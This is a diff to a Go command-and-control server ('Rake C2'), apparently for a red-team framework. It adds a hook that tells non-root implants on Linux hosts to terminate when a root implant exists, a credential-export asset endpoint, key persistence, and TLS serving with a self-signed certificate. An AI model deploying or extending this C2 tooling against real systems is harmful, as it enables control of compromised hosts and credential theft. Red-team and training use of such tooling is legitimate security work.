@@ -4,21 +4,26 @@ import (
 	"context"
 	"crypto/ecdh"
 	"crypto/rand"
+	"crypto/rsa"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"io/fs"
 	"log"
+	"math/big"
 	"net"
 	"net/http"
 	"os"
 	"strings"
+	"time"
 
 	"entgo.io/ent/dialect/sql"
 	"github.com/jessevdk/go-flags"
 	_ "github.com/mattn/go-sqlite3"
-	"golang.org/x/net/http2"
-	"golang.org/x/net/http2/h2c"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/metadata"
@@ -41,6 +46,8 @@ type Options struct {
 	TomesPath  string `short:"t" long:"tomes-path" description:"Path to the Tomes directory" required:"true"`
 	ListenAddr string `short:"l" long:"listen" description:"Address to listen on (e.g. :8000)" default:":8000"`
 	PrivateKey string `short:"k" long:"private-key" description:"Base64 encoded X25519 private key. If not provided, a random one is generated."`
+	CertFile   string `short:"c" long:"cert" description:"Path to TLS certificate file"`
+	KeyFile    string `long:"key" description:"Path to TLS key file"`
 }
 
 // RakeServer wraps c2.Server to add extended functionality
@@ -56,15 +63,52 @@ type CredentialExport struct {
 	Kind      string `json:"kind"`
 }
 
+// Hook claim tasks
+func (s *RakeServer) ClaimTasks(ctx context.Context, req *c2pb.ClaimTasksRequest) (*c2pb.ClaimTasksResponse, error) {
+	// If we have a root beacon, and we are NOT root, kill ourself
+	h, err := s.client.Host.Query().
+		Where(host.IdentifierEQ(req.Beacon.Host.Identifier)).
+		Only(ctx)
+	// Non-root beacon, if there _is_ a root beacon, tell this one to close
+	if err == nil && req.Beacon.Principal != "root" {
+		// Loop through each beacon,
+		beacons, err := h.QueryBeacons().All(ctx)
+		if err == nil {
+			for _, b := range beacons {
+				if h.Platform == c2pb.Host_PLATFORM_LINUX {
+					if b.Principal == "root" {
+						resp := c2pb.ClaimTasksResponse{
+							Tasks: []*c2pb.Task{
+								{
+									Id:        int64(99),
+									QuestName: "sshhh",
+									Tome: &epb.Tome{
+										Eldritch: "agent._terminate_this_process_clowntown()",
+									},
+								},
+							},
+						}
+						return &resp, nil
+					}
+				}
+			}
+		}
+	}
+
+	// else just use the normal one
+	return s.Server.ClaimTasks(ctx, req)
+}
 func (s *RakeServer) FetchAsset(req *c2pb.FetchAssetRequest, stream c2pb.C2_FetchAssetServer) error {
+	md, _ := metadata.FromIncomingContext(stream.Context())
+	fmt.Printf("Stream context metadata: %+v\n", md)
 	if strings.HasPrefix(req.Name, "host:credentials") {
 		ctx := stream.Context()
-		
+
 		var hostIdentifier string
 		if strings.HasPrefix(req.Name, "host:credentials:") {
 			hostIdentifier = strings.TrimPrefix(req.Name, "host:credentials:")
 		}
-		
+
 		if hostIdentifier == "" {
 			return status.Errorf(codes.InvalidArgument, "must specify host identifier in asset name, e.g. host:credentials:<id>")
 		}
@@ -115,6 +159,36 @@ func (s *RakeServer) FetchAsset(req *c2pb.FetchAssetRequest, stream c2pb.C2_Fetc
 	}
 
 	return s.Server.FetchAsset(req, stream)
+}
+
+func generateSelfSignedCert() (tls.Certificate, error) {
+	priv, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+
+	template := x509.Certificate{
+		SerialNumber: big.NewInt(1),
+		Subject: pkix.Name{
+			Organization: []string{"Rake C2"},
+		},
+		NotBefore: time.Now(),
+		NotAfter:  time.Now().Add(365 * 24 * time.Hour),
+
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+	}
+
+	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+
+	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
+	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
+
+	return tls.X509KeyPair(certPEM, keyPEM)
 }
 
 func getRemoteIP(ctx context.Context) string {
@@ -190,7 +264,28 @@ func main() {
 	var pubKey *ecdh.PublicKey
 	curve := ecdh.X25519()
 
+	keyPath := opts.DBName + ".grpc.key"
+	if opts.PrivateKey == "" {
+		if _, err := os.Stat(keyPath); err == nil {
+			log.Printf("Found existing key at %s, loading...", keyPath)
+			content, err := os.ReadFile(keyPath)
+			if err != nil {
+				log.Fatalf("failed to read private key file: %v", err)
+			}
+			opts.PrivateKey = strings.TrimSpace(string(content))
+		}
+	}
+
 	if opts.PrivateKey != "" {
+		// If it's a file path (other than the default one we might have just checked)
+		if _, err := os.Stat(opts.PrivateKey); err == nil {
+			content, err := os.ReadFile(opts.PrivateKey)
+			if err != nil {
+				log.Fatalf("failed to read private key file: %v", err)
+			}
+			opts.PrivateKey = strings.TrimSpace(string(content))
+		}
+
 		keyBytes, err := base64.StdEncoding.DecodeString(opts.PrivateKey)
 		if err != nil {
 			log.Fatalf("failed to decode private key: %v", err)
@@ -200,14 +295,22 @@ func main() {
 			log.Fatalf("invalid private key: %v", err)
 		}
 	} else {
-		log.Println("No private key provided, generating a random one...")
+		log.Println("No private key provided and none found at default path, generating a random one...")
 		var err error
 		privKey, err = curve.GenerateKey(rand.Reader)
 		if err != nil {
 			log.Fatalf("failed to generate private key: %v", err)
 		}
+
+		// Save the generated key
+		log.Printf("Saving generated GRPC private key to %s", keyPath)
+		keyBytes := privKey.Bytes()
+		encodedKey := base64.StdEncoding.EncodeToString(keyBytes)
+		if err := os.WriteFile(keyPath, []byte(encodedKey), 0600); err != nil {
+			log.Printf("Warning: failed to save generated key: %v", err)
+		}
 	}
-	
+
 	pubKey = privKey.PublicKey()
 	log.Printf("Server Public Key (Base64): %s", base64.StdEncoding.EncodeToString(pubKey.Bytes()))
 
@@ -229,22 +332,60 @@ func main() {
 
 	c2pb.RegisterC2Server(grpcSrv, rakeSrv)
 
-	// 6. Wrap in HTTP/2 (h2c) handler
-	handler := h2c.NewHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.ProtoMajor != 2 {
-			http.Error(w, "grpc requires HTTP/2", http.StatusBadRequest)
-			return
-		}
-		if contentType := r.Header.Get("Content-Type"); !strings.HasPrefix(contentType, "application/grpc") {
-			http.Error(w, "must specify Content-Type application/grpc", http.StatusBadRequest)
-			return
-		}
-		grpcSrv.ServeHTTP(w, r)
-	}), &http2.Server{})
+	// 6. Start Server (TLS)
+	log.Printf("Listening on %s (TLS)", opts.ListenAddr)
 
-	// 7. Start Server
-	log.Printf("Listening on %s", opts.ListenAddr)
-	if err := http.ListenAndServe(opts.ListenAddr, handler); err != nil {
+	var tlsConfig *tls.Config
+	if opts.CertFile != "" && opts.KeyFile != "" {
+		cert, err := tls.LoadX509KeyPair(opts.CertFile, opts.KeyFile)
+		if err != nil {
+			log.Fatalf("failed to load TLS keys: %v", err)
+		}
+		tlsConfig = &tls.Config{
+			Certificates: []tls.Certificate{cert},
+			NextProtos:   []string{"h2"},
+		}
+	} else {
+		log.Println("No TLS keys provided, generating self-signed certificate...")
+		cert, err := generateSelfSignedCert()
+		if err != nil {
+			log.Fatalf("failed to generate self-signed certificate: %v", err)
+		}
+		tlsConfig = &tls.Config{
+			Certificates: []tls.Certificate{cert},
+			NextProtos:   []string{"h2"},
+		}
+	}
+
+	lis, err := net.Listen("tcp", opts.ListenAddr)
+	if err != nil {
+		log.Fatalf("failed to listen: %v", err)
+	}
+
+	tlsLis := tls.NewListener(lis, tlsConfig)
+
+	// Setup HTTP/1.x / HTTP/2 multiplexer
+	mux := http.NewServeMux()
+	mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/plain")
+		fmt.Fprintf(w, "%s\n", base64.StdEncoding.EncodeToString(pubKey.Bytes()))
+	})
+
+	// Create a handler that routes traffic to gRPC or HTTP mux based on protocol and content type
+	rootHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.ProtoMajor == 2 && strings.Contains(r.Header.Get("Content-Type"), "application/grpc") {
+			grpcSrv.ServeHTTP(w, r)
+		} else {
+			mux.ServeHTTP(w, r)
+		}
+	})
+
+	// Use http.Serve instead of grpcSrv.Serve to handle both
+	srv := &http.Server{
+		Handler: rootHandler,
+	}
+
+	if err := srv.Serve(tlsLis); err != nil {
 		log.Fatalf("server failed: %v", err)
 	}
 }
